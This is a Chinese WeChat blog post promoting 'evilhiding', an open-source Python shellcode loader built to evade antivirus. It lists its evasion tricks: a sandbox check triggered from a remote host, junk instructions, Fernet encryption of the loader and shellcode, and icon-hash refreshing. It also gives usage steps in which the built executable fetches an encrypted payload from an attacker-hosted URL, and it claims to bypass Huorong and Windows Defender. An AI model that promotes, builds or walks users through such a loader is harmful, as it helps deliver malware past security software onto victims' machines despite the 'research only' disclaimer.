#  evilhiding：一款好用的shellcode免杀工具

原创 coleak  [ 渗透测试安全攻防 ](javascript:void\(0\);)

**渗透测试安全攻防** ![]()

微信号 coleakandyueyiyi

功能介绍 分享一些web安全、代码审计、渗透测试、红队攻防、漏洞复现、CTF以及个人经验。成分复杂，期待和各位师傅一起进步

____

___发表于_

收录于合集

#免杀 1 个

#内网安全 24 个

#python 2 个

#安全工具 8 个

#开源工具 3 个

> 关注并星标🌟 一起学安全❤️
>
> 作者：coleak  
>
> 首发于公号：渗透测试安全攻防
>
> 字数：5352
>
> 声明：仅供学习参考，请勿用作违法用途

 **目录**

  * 工具浅析

  * 项目地址

  * 用法

  * 免杀测试

  * 声明

# evilhiding

shellcode loader,bypassav,免杀工具，一款基于python的shellcode免杀加载器

## 工具浅析

  * 远控条件触发防沙箱
  * 花指令干扰
  * loader和shellcode进行fernet加密
  * 触发器混淆干扰特征码
  * 自动刷新ico图片的md5，防止图标特征码被查杀

## 项目地址

github开源，求个stars嘻嘻嘻(stars是更新的动力)

    
    
    https://github.com/coleak2021/evilhiding.git  
    

## 用法

  * 安装依赖

    
    
    pip install -r requirements.txt  
    

  * 执行main.py

    
    
    将shellcode填入main.py  
    python main.py #会生成a.txt和b.py  
    

  * 将a.txt放入vps，并将a.txt的url填入b.py中，再执行create.py

    
    
    例如：url='http://192.168.52.129/a.txt'  
    python create.py  
    dist目录下生成HipsMain.exe  
    

 **仅支持windows系统编译!**

##  免杀测试

 **过火绒**

![]()

 **过defender**

![]()

 **动态执行**

![]()

##  声明

  * 仅限用于技术研究和获得正式授权的测试活动。由于传播、利用本工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，工具作者不为此承担任何责任。
  * 工具并没有多少技术含量，站在前辈肩膀上造轮子而已
  * 不能免杀可以提Issues，stars是持续更新的动力，嘻嘻嘻。

  

  

文章首发于：渗透测试安全攻防

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

